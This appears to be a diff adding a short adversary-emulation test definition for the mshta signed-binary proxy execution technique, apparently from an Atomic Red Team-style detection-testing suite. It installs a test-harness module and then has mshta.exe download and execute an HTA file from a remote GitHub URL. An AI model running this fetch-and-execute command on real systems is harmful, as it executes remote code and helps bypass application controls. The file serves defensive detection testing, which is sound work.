@@ -1,0 +1,11 @@
+#TechniqueName: Signed Binary Proxy Execution: Mshta
+#AtomicTestName: Invoke HTML Application - Direct download from URI
+#Description: Executes an HTA Application by directly downloading from remote URI.
+#Language: ps1
+
+#get_prereq_commands
+Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force
+
+
+#commands
+Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe
